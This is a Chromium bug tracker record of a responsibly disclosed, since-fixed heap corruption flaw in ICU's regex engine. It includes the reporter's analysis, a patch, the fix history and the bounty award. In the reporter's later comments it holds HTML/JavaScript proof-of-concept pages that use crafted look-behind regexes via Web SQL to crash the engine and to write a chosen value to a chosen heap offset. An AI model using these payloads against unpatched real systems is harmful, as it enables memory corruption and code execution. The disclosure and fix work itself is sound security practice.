# UNKNOWN in icu_52::RegexMatcher::MatchChunkAt

| Field | Value |
|-------|-------|
| **Issue ID** | [40080794](https://issues.chromium.org/issues/40080794) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | ya...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2014-11-05 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

The ICU regexp engine uses int32 type to represent an opcode in the compiled pattern. In this representation, the most significant 8 bits encode the opcode type, and the remaining 24 bits contain the opcode's optional parameter. This is evident from the following macro definitions found in regeximp.h:

(Taken from regeximp.h)  

254 //  

255 // Convenience macros for assembling and disassembling a compiled operation.  

256 //  

257 #define URX\_BUILD(type, val) (int32\_t)((type << 24) | (val))  

258 #define URX\_TYPE(x) ((uint32\_t)(x) >> 24)  

259 #define URX\_VAL(x) ((x) & 0xffffff)

Among all the opcodes defined by ICU, the one related to this bug is URX\_LBN\_CONT, which is emitted by the compiler in response to a negative look-behind assertion. According to the following code from regeximp.h and some other sources, the URX\_LBN\_CONT opcode has four parameters: the first parameter is embedded directly in the lower 24 bits (the VAL portion) of the opcode itself, while each of the rest three occupies one slot in the compiled pattern.

(Taken from regeximp.h)  

163 URX\_LBN\_CONT = 47, // Negative LookBehind Continue  

164 // Param 0: the data location  

165 // Param 1: The minimum length of the look-behind match  

166 // Param 2: The max length of the look-behind match  

167 // Param 3: The pattern loc following the look-behind block.

Now the focus is Param 2, the max length of the look-behind match, which is where the overflow occurs. The value of this parameter is calculated by:

(Taken from regexcmp.cpp)  

2163 // Determine the min and max bounds for the length of the  

2164 // string that the pattern can match.  

2165 // An unbounded upper limit is an error.  

2166 int32\_t patEnd = fRXPat->fCompiledPat->size() - 1;  

2167 int32\_t minML = minMatchLength(fMatchOpenParen, patEnd);  

2168 int32\_t maxML = maxMatchLength(fMatchOpenParen, patEnd);

and assigned to the compiled pattern by:

(Taken from regexcmp.cpp)  

2175 // Insert the min and max match len bounds into the URX\_LB\_CONT op that  

2176 // appears at the top of the look-behind block, at location fMatchOpenParen+1  

2177 fRXPat->fCompiledPat->setElementAt(minML, fMatchOpenParen-3);  

2178 fRXPat->fCompiledPat->setElementAt(maxML, fMatchOpenParen-2);

Neither of them checks the range of the computed maxML variable. So if this value is large enough, it will overflow the 24-bit VAL portion and redefine the type of this opcode.

For example, consider the pattern (?<!\A(\A{11000}){11000}). For this pattern, the value computed for maxML is 121000001, or 0x07365041. Obviously an overflow to the most significant 8 bits has occurred. Now the opcode is of type 0x7, or URX\_NOP as defined by the source code. From the view point of the regexp engine, the following opcodes have been generated:

## SLOT OPCODE

0 STATE\_SAVE 2  

1 JMP 3  

2 FAIL  

3 NOP  

4 NOP  

5 LB\_START 0  

6 LBN\_CONT 0  

7 (Param 1)  

8 NOP <- Should have been Param 2, MaxMatchLength  

9 (Param 3)  

10 NOP  

11 NOP  

12 ONE\_CHAR 0x41  

...

Up to now, everything is fine as long as the overflowed opcode is interpreted consistently by the RegexMatcher as the max length. However, before the opcode generation phase is done, the compiler goes another pass through the compiled pattern, looking for opcodes of type URX\_NOP and stripping them away:

(Taken from regexcmp.cpp)  

307 //  

308 // Optimization pass 1: NOPs, back-references, and case-folding  

309 //  

310 stripNOPs();

This will remove the URX\_NOP opcode caused by the overflow and shift the following non-NOP opcodes forward. Now the compiled pattern looks like the following:

## SLOT OPCODE

0 STATE\_SAVE 2  

1 JMP 3  

2 FAIL  

3 LB\_START 0  

4 LBN\_CONT 0  

5 (Param 1)  

6 (Param 3) <- Used as Param 2 (MaxMatchLength)  

7 ONE\_CHAR 0x41 <- Used as Param 3 (Continue Loc)  

...

Note how this effectively modifies the 3rd parameter of URX\_LBN\_CONT to 0x41, which is actually the parameter value of the URX\_ONECHAR opcode that follows. So if the negative look-behind fails to match, the engine will pick up the opcode at index 0x41 and continue execution from there. By changing the character 'A' to another one (say \ubeef), it's possible to control where the regexp engine goes, leading to arbitrary regexp opcode execution. Since there are plenty of opportunities to do memory reads/writes during interpretation of opcodes, it is possible to achieve arbitrary machine code execution through this bug.

**VERSION**

Chrome 38.0.2125.111 (64-bit) Stable / Ubuntu 14.04 LTS  

Chrome 39.0.2171.42 (64-bit) Beta / Ubuntu 14.04 LTS  

Chrome 40.0.2202.3 (64-bit) Dev / Ubuntu 14.04 LTS

**REPRODUCTION CASE**

<html>
<head>
<script>
var db = openDatabase('test\_db', '1.0', 'Test database', 1024);
db.transaction(function(tx) {
for (i = 0; i < 1000; i++) {
tx.executeSql('SELECT "AAAAABBBBBCCCCCDDDDEEEEE" REGEXP "(?<!\\ubeaf(\\ubeaf{11000}){11000})"');
}
location.reload();
});
</script>
</head>
</html>

## Attachments

- [asan_log.txt](attachments/asan_log.txt) (text/plain, 18.8 KB)
- [debug_win.png](attachments/debug_win.png) (image/png, 67.0 KB)

## Timeline

### cl...@chromium.org (2014-11-05)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5680381117333504

### ya...@gmail.com (2014-11-05)

This bug is easy to fix. A simple range check before the parameter is written to the compiled pattern will solve the problem.

--- regexcmp.cpp.bak	2014-11-05 13:40:35.450877118 +0800
+++ regexcmp.cpp	2014-11-05 13:45:08.338871815 +0800
@@ -2133,6 +2133,10 @@
             int32_t patEnd   = fRXPat->fCompiledPat->size() - 1;
             int32_t minML    = minMatchLength(fMatchOpenParen, patEnd);
             int32_t maxML    = maxMatchLength(fMatchOpenParen, patEnd);
+            if (URX_TYPE(maxML) != 0) {
+                error(U_REGEX_NUMBER_TOO_BIG);
+                break;
+            }
             if (maxML == INT32_MAX) {
                 error(U_REGEX_LOOK_BEHIND_LIMIT);
                 break;
@@ -2166,6 +2170,10 @@
             int32_t patEnd   = fRXPat->fCompiledPat->size() - 1;
             int32_t minML    = minMatchLength(fMatchOpenParen, patEnd);
             int32_t maxML    = maxMatchLength(fMatchOpenParen, patEnd);
+            if (URX_TYPE(maxML) != 0) {
+                error(U_REGEX_NUMBER_TOO_BIG);
+                break;
+            }
             if (maxML == INT32_MAX) {
                 error(U_REGEX_LOOK_BEHIND_LIMIT);
                 break;


### sc...@gmail.com (2014-11-05)

@yangdingning: wow, excellent bug report and a great find via manual analysis!

Clusterfuzz seems to see this crash address under ASAN:
SEGV on unknown address 0x612000105af8

Do you by any chance have a repro that exhibits a crash on an attacker-controlled write? That would help us triage for exploitability much more quickly and also possible bump up the reward.

### ya...@gmail.com (2014-11-05)

@scarybeasts
Sure, I'll have a try.


### cl...@chromium.org (2014-11-05)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5680381117333504

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x612000105df8
Crash State:
  icu_52::RegexMatcher::MatchChunkAt
  icu_52::RegexMatcher::matches
  uregex_matches_52
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=284099:284275

Minimized Testcase (0.28 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94y52F7eXAQLYmD1DfiX5E3F0D-VPsx45qJYYjPqZY4vEoQlsiqBHNnX6XrjwEC2DYaENJGqmxgAGq4x4MAMT3gPaSen0r3LQvYPt1veJvjAtt5DaElrSw8TeCAdQ7lNfy_tjEFNY8ADR48zDQEtXAFrVGiuw
<script>
	var db = openDatabase('test_db', '1.0', 'Test database', 1024);
	db.transaction(function(tx) {
		for (i = 0; i < 1000; i++) {
			tx.executeSql('SELECT "AAAAABBBBBCCCCCDDDDEEEEE" REGEXP "(?<!\\ubeaf(\\ubeaf{11000}){11000})"');
		}
		location.reload();
	});
</script>
</head>
</html>




### in...@chromium.org (2014-11-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-05)

[Empty comment from Monorail migration]

### ya...@gmail.com (2014-11-08)

The following PoC shows how this bug can be used to make a targeted memory write with an attacker selected value. It'll trick the engine into writing 0xbeef to an address at offset 0xf00d, relative to the start of fData array allocated on the heap. This is best illustrated with the attached screenshot.

<html>
<head>
<script>
	var db = openDatabase('test_db', '1.0', 'Test database', 1024);
	db.transaction(function(tx) {
		for (i = 0; i < 1000; i++) {
			tx.executeSql('SELECT "' + Array(0xbeef+1).join('A') + '" REGEXP "(?<!\\u001c(A{11000}){11000})|(?<!A(A{311}){2373823})|(?<!A(A{32768}){19456})"');
		}
		location.reload();
	});
</script>
</head>
</html>

Here is another PoC to demonstrate the precision of memory write achievable through this bug. When loaded into Chromium 40.0.2182.0 64-bit (ASan instrumented release) running on Ubuntu 14.04 TLS, it will write 0xbeef right after the end of fData array, leaving no gaps behind.

<html>
<head>
<script>
	var db = openDatabase('test_db', '1.0', 'Test database', 1024);
	db.transaction(function(tx) {
		for (i = 0; i < 1000; i++) {
			tx.executeSql('SELECT "' + Array(0xbeef+1).join('A') + '" REGEXP "(?<!\\u001c(A{11000}){11000})|(?<!A(A{7177}){102856})|(?<!A(A{32768}){19456})"');
		}
		location.reload();
	});
</script>
</head>
</html>


This is how ASan reports it (full log is attached below):

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ??
Shadow bytes around the buggy address:
  0x0c1080006840: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
  0x0c1080006850: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 04 fa
  0x0c1080006860: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c1080006870: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c1080006880: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c1080006890:[fa]fa fa fa 00 00 00 00 00 00 00 00 00 fc fc fc
  0x0c10800068a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c10800068b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c10800068c0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c10800068d0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c10800068e0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00

In both repros, the regexp is obtained by concatenating three similar negative look-behind assertions with the alternation symbol. Here, assertion #1 crafts a URX_NOP opcode and forms a jump towards assertion #2 when this NOP is stripped. Assertion #2 crafts an extra URX_LB_START; when this opcode is executed by the engine, the following code will perform the desired memory write:

5313    case URX_LB_START:
5314        {
5315            // Entering a look-behind block.
5316            // Save Stack Ptr, Input Pos.
5317            //   TODO:  implement transparent bounds.  Ticket #6067
5318            U_ASSERT(opValue>=0 && opValue+1<fPattern->fDataSize);
5319            fData[opValue]   = fStack->size();
5320            fData[opValue+1] = fp->fInputIdx;
5321            // Init the variable containing the start index for attempted matches.
5322            fData[opValue+2] = -1;
5323            // Save input string length, then reset to pin any matches to end at
5324            //   the current position.
5325            fData[opValue+3] = fActiveLimit;
5326            fActiveLimit     = fp->fInputIdx;
5327        }
5328        break;

Assertion #3 is needed here to work around an unconditioned for loop during the compilation of the pattern. Without it, the compiler will be trapped in this loop infinitely. This assertion forges an URX_LA_END opcode to balance the extra URX_LB_START introduced in the preceding assertion.

The two alternation symbols are added to the pattern for a similar reason: if we leave them out, it will take quite some time to match the pattern with a long string, as is the case for the repros. Their addition will terminate the match early, which is important for the PoC to be useful in practice.


### in...@chromium.org (2014-11-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-08)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### ya...@gmail.com (2014-11-09)

Oops, I see a typo in my original post. The regexp used as example should be (?<!A(A{11000}){11000}), not (?<!\A(\A{11000}){11000}). No idea why I'd include those extra backslashes in the first place.

### js...@chromium.org (2014-11-10)

Thank you for the bug report and a patch. I'm adding the author of ICU regex engine (aheninger@google.com) and will talk to him about the patch and get back here. 
It looks like adding a range check should fix this issue as suggested. 





### sc...@gmail.com (2014-11-12)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-11-13)

http://bugs.icu-project.org/trac/ticket/11370 is an upstream bug (not visible) and they have a patch in review. I'll apply it once it's landed in the upstream. 

### bu...@chromium.org (2014-11-14)

------------------------------------------------------------------
r292943 | jshin@chromium.org | 2014-11-14T19:41:00.543510Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/i18n/regexcmp.cpp?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/test/testdata/regextst.txt?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/README.chromium?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/i18n/regexcmp.h?r1=292943&r2=292942&pathrev=292943

Cherry-pick two upstream patches to the ICU regex engine

The patches for the following upstream two bugs are cherry-picked:

  http://bugs.icu-project.org/trac/ticket/11369
  http://bugs.icu-project.org/trac/ticket/11370


BUG=422824,430353
TEST=See the bugs.
TBR=mbarbella

Review URL: https://codereview.chromium.org/732743002
-----------------------------------------------------------------

### bu...@chromium.org (2014-11-14)

------------------------------------------------------------------
r292944 | jshin@chromium.org | 2014-11-14T19:50:50.025756Z

Changed paths:
   A http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/patches/regex.patch?r1=292944&r2=292943&pathrev=292944

Add regex.patch file forgotten in the previous CL

BUG=422824,430353
TEST=NONE
TBR=mbarbella

Review URL: https://codereview.chromium.org/719943004
-----------------------------------------------------------------

### bu...@chromium.org (2014-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2e9716bacd10f8e8444190894fec0e4d55804a7e

commit 2e9716bacd10f8e8444190894fec0e4d55804a7e
Author: Jungshik Shin (jungshik at google) <jshin@chromium.org>
Date: Fri Nov 14 23:50:22 2014

Roll src/third_party/icu d8b2a9d:6242e2f (svn 292476:292944)

Summary of changes available at:
https://chromium.googlesource.com/chromium/deps/icu52/+log/d8b2a9d..6242e2f

BUG=422824,430353
TEST=See the bugs (https://crbug.com/chromium/422824#c0, https://crbug.com/chromium/430353#c5)
R=mbarbella@chromium.org
TBR=mbarbella

Review URL: https://codereview.chromium.org/726973003

Cr-Commit-Position: refs/heads/master@{#304299}

[modify] https://chromium.googlesource.com/chromium/src.git/+/2e9716bacd10f8e8444190894fec0e4d55804a7e/DEPS


### cl...@chromium.org (2014-11-15)

ClusterFuzz has detected this issue as fixed in range 304258:304325.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5680381117333504

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x612000105df8
Crash State:
  icu_52::RegexMatcher::MatchChunkAt
  icu_52::RegexMatcher::matches
  uregex_matches_52
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=284099:284275
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=304258:304325

Minimized Testcase (0.28 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94y52F7eXAQLYmD1DfiX5E3F0D-VPsx45qJYYjPqZY4vEoQlsiqBHNnX6XrjwEC2DYaENJGqmxgAGq4x4MAMT3gPaSen0r3LQvYPt1veJvjAtt5DaElrSw8TeCAdQ7lNfy_tjEFNY8ADR48zDQEtXAFrVGiuw
<script>
	var db = openDatabase('test_db', '1.0', 'Test database', 1024);
	db.transaction(function(tx) {
		for (i = 0; i < 1000; i++) {
			tx.executeSql('SELECT "AAAAABBBBBCCCCCDDDDEEEEE" REGEXP "(?<!\\ubeaf(\\ubeaf{11000}){11000})"');
		}
		location.reload();
	});
</script>
</head>
</html>

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### bu...@chromium.org (2014-11-17)

The following revision refers to this bug:
  http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=64556

------------------------------------------------------------------
r64556 | jungshik@google.com | 2014-11-17T20:34:27.114728Z

-----------------------------------------------------------------

### cl...@chromium.org (2014-11-21)

jshin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### js...@chromium.org (2014-11-25)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-11-25)

It's fixed in both M40 and M41. 


### cl...@chromium.org (2014-11-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2014-12-03)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-12-04)

Asking for merge to M39. ICU has moved to git and chromium/m39 branch was made. Once approved, we're ready to bring the fix into M39. 



### ma...@google.com (2014-12-04)

[Automated comment] Request affecting a post-stable build (M39), manual review required.

### bu...@chromium.org (2014-12-09)

The following revision refers to this bug:
  http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=65577

------------------------------------------------------------------
r65577 | jungshik@google.com | 2014-12-09T00:33:36.588803Z

-----------------------------------------------------------------

### in...@chromium.org (2014-12-15)

[Empty comment from Monorail migration]

### ti...@google.com (2015-01-22)

Congratulations - $5000 for this report! Notes from reward panel: "Good bug with an excellent report!". 

We've credited you as yangdingning in our release notes. Let me know if you want to use another name/handle and we should be in contact in a few weeks to start the payment process.

### cl...@chromium.org (2015-03-04)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-03-06)

[Empty comment from Monorail migration]

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/430353?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080794)*
